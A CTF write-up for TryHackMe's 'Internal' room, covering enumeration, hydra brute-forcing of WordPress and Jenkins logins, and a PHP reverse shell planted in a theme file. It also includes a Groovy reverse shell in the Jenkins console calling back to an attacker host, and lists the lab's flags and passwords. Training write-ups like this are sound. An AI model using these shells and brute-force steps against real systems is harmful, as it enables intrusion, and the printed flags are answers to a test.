
# Internal 

This writeup covers the "Internal" CTF challenge on TryHackMe, you can find it [here](https://tryhackme.com/room/internal)
---

## Objective
Retrieve two flags:
1. **User flag**: Found in `/home/aubreanna/user.txt`.
2. **Root flag**: Found in `/root/root.txt`.

---


## Detailed Steps

### 1. Initial Enumeration
- Ran an `nmap` scan to identify open ports and services:
  ```bash
  nmap 10.10.21.216
  ```
- Results:
  ```
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  ```
- **Analysis**: 2 open ports. Port 80 suggests a web application, likely WordPress (based on later findings), and port 22 indicates potential SSH access with credentials [].
- Added the target to `/etc/hosts` to resolve `internal.thm`:
  ```bash
  nano /etc/hosts
  ```
- Added:
  ```
  10.10.21.216 internal.thm
  ```

### 2. Web Enumeration
- Visited `http://internal.thm` to explore the web server (default apache server).
- Ran `gobuster` to enumerate directories:
  ```bash
  gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100
  ```
- Results:
  ```
  /wordpress (Status: 301)
  /blog (Status: 301)
  /javascript (Status: 301)
  /phpmyadmin (Status: 301)
  ```
- **Analysis**:
  - `/wordpress` and `/blog`: Likely WordPress installations [].
  - `/phpmyadmin`: Database management, often paired with WordPress, but requires credentials [].
  - `/javascript`: Static assets, likely unimportant [].
- Focused on `/blog` and ran another `gobuster` scan:
  ```bash
  gobuster dir -u http://internal.thm/blog -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100
  ```
- Results:
  ```
  /wp-content (Status: 301)
  /wp-includes (Status: 301)
  /wp-admin (Status: 301)
  ```
- **Key Insight**: `/blog` hosts a WordPress site, confirmed by `wp-` directories. `/wp-admin` is the admin login page [].

### 3. Brute-Force WordPress Admin Credentials
- Visited `http://internal.thm/blog/wp-admin` and tested credentials:
  - `test:test`: Returned "unknown username" [].
  - `admin:admin`: Returned "incorrect password for admin," confirming the username `admin` exists [].
- Intercepted the login request with Burp Suite to craft a `hydra` command:
  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/blog/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:incorrect" -t 4 -f
  ```
- Flags explained:
  - `-l admin`: Username `admin`.
  - `-P /usr/share/wordlists/rockyou.txt`: Password wordlist.
  - `http-post-form`: Target the WordPress login form.
  - `:incorrect`: Failure message for incorrect passwords.
  - `-t 4`: 4 threads for speed.
  - `-f`: Stop on first valid pair.
- Results:
  ```
  [80][http-post-form] host: internal.thm   login: admin   password: my2boys
  ```
- **Credentials**: `admin:my2boys` [].

### 4. Upload Reverse Shell via WordPress
- Logged into `http://internal.thm/blog/wp-admin` with `admin:my2boys`.
- Navigated to **Appearance > Theme Editor** and selected the **Twenty Seventeen** theme [].
- Edited `404.php` to include a reverse shell from [revshells.com](https://www.revshells.com/) (e.g., PHP reverse shell):
  ```php
  <?php
  $sock = fsockopen("[ATTACKER IP]", 7775);
  $proc = proc_open("/bin/bash", array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")), $pipes);
  stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0);
  while (!feof($sock) && !feof($pipes[1])) {
      $read = array($sock, $pipes[1], $pipes[2]);
      $write = NULL; $except = NULL; $num_changed = stream_select($read, $write, $except, NULL);
      if ($num_changed > 0) {
          foreach ($read as $r) {
              $data = fread($r, 4096);
              if ($r == $sock) { fwrite($pipes[0], $data); }
              else { fwrite($sock, $data); }
          }
      }
  }
  fclose($sock); proc_close($proc);
  ?>
  ```
- Started a Netcat listener:
  ```bash
  nc -lvnp 7775
  ```
- Visited `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php` to trigger the shell.
- **Result**: Got a reverse shell as `www-data`:
  ```bash
  connect to [ATTACKER IP] from (UNKNOWN) [10.10.21.216] 47092
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  www-data@internal:/$
  ```

### 5. Enumerate as www-data
- Ran `linpeas.sh` for automated enumeration:
  ```bash
  python3 -m http.server
  cd /tmp
  wget http://[ATTACKER IP]:8000/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh
  ```
- Found a suspicious file in `/opt`:
  ```bash
  cd /opt
  ls -la
  ```
- Output:
  ```
  total 16
  drwxr-xr-x  3 root root 4096 Aug  3  2020 .
  drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
  drwx--x--x  4 root root 4096 Aug  3  2020 containerd
  -rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
  ```
- Viewed `wp-save.txt`:
  ```bash
  cat wp-save.txt
  ```
- Content:
  ```
  Bill,
  Aubreanna needed these credentials for something later. Let her know you have them and where they are.
  aubreanna:bubb13guM!@#123
  ```
- **Key Insight**: SSH credentials for user `aubreanna` [].

### 6. SSH as aubreanna
- Tested the credentials:
  ```bash
  ssh aubreanna@10.10.21.216
  ```
- Password: `bubb13guM!@#123`
- Success: Logged in as `aubreanna`.
- Listed files:
  ```bash
  ls
  ```
- Output:
  ```
  jenkins.txt  snap  user.txt
  ```
- Read user flag:
  ```bash
  cat user.txt
  ```
- Content: `THM{int3rna1_fl4g_1}` [].
- Read `jenkins.txt`:
  ```bash
  cat jenkins.txt
  ```
- Content:
  ```
  Internal Jenkins service is running on 172.17.0.2:8080
  ```
- **Key Insight**: A Jenkins service is running internally on `172.17.0.2:8080`, likely in a Docker container (based on `docker0` IP `172.17.0.1`) [].

### 7. Pivot to Jenkins via SSH Tunneling
- Checked network services:
  ```bash
  netstat -ano | less
  ```
- Relevant output:
  ```
  tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN off (0.00/0/0)
  ```
- **Observation**: Port 8080 is bound to `127.0.0.1`, but `jenkins.txt` indicates Jenkins is on `172.17.0.2:8080`, requiring network pivoting [].
- Set up SSH tunneling to forward `172.17.0.2:8080` to `localhost:8090`:
  ```bash
  ssh -L 8090:172.17.0.2:8080 aubreanna@10.10.21.216
  ```
- Password: `bubb13guM!@#123`
- On the attacking machine, visited `http://localhost:8090` in Firefox—found a Jenkins login page [].

### 8. Enumerate Jenkins
- Ran `gobuster` on the Jenkins instance:
  ```bash
  gobuster dir -u http://localhost:8090 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -b 403,404 --exclude-length 865
  ```
- Results:
  ```
  /login (Status: 200)
  /assets (Status: 302)
  /logout (Status: 302)
  /error (Status: 400)
  /git (Status: 302)
  /oops (Status: 200)
  /cli (Status: 302)
  ```
- **Analysis**: `/login` is the Jenkins login page. Other endpoints are standard Jenkins paths, but nothing immediately exploitable [].

### 9. Brute-Force Jenkins Credentials
- Tested default credentials and brute-forced the login form:
  ```bash
  hydra 127.0.0.1 -s 8090 -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt
  ```
- Results:
  ```
  [8090][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
  ```
- **Credentials**: `admin:spongebob` [].
- Logged into `http://localhost:8090` with `admin:spongebob`.

### 10. Exploit Jenkins Script Console
- Navigated to **Manage Jenkins > Script Console**, which allows running Groovy scripts with system privileges [].
- Used a Groovy reverse shell script:
  ```groovy
  String host = "[ATTACKER IP]";
  int port = 4444;
  String cmd = "/bin/bash";
  Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
  Socket s = new Socket(host, port);
  InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
  OutputStream po = p.getOutputStream(), so = s.getOutputStream();
  while (!s.isClosed()) {
      while (pi.available() > 0) so.write(pi.read());
      while (pe.available() > 0) so.write(pe.read());
      while (si.available() > 0) po.write(si.read());
      so.flush();
      po.flush();
      Thread.sleep(50);
      try {
          p.exitValue();
          break;
      } catch (Exception e) {}
  }
  p.destroy();
  s.close();
  ```
- Started a Netcat listener:
  ```bash
  nc -lvnp 4444
  ```
- Ran the script in the Jenkins Script Console.
- **Result**: Got a reverse shell as `jenkins`:
  ```bash
  id
  uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
  ```
- Stabilized the shell:
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  export TERM=xterm
  ```

### 11. Enumerate as jenkins
- Ran `linpeas.sh` again:
  ```bash
  cd /tmp
  wget http://[ATTACKER IP]:8000/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh
  ```
- Found a suspicious file in `/opt`:
  ```bash
  cd /opt
  ls
  ```
- Output:
  ```
  note.txt
  ```
- Viewed `note.txt`:
  ```bash
  cat note.txt
  ```
- Content:
  ```
  Aubreanna,
  Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here. Use them if you need access to the root user account.
  root:tr0ub13guM!@#123
  ```
- **Key Insight**: Root SSH credentials [].

### 12. SSH as root
- Tested the credentials:
  ```bash
  ssh root@10.10.21.216
  ```
- Password: `tr0ub13guM!@#123`
- Success: Logged in as `root`.
- Verified:
  ```bash
  id
  ```
- Output:
  ```
  uid=0(root) gid=0(root) groups=0(root)
  ```
- Found the root flag:
  ```bash
  cd /root
  cat root.txt
  ```
- Content: `THM{d0ck3r_d3str0y3r}` [].

---

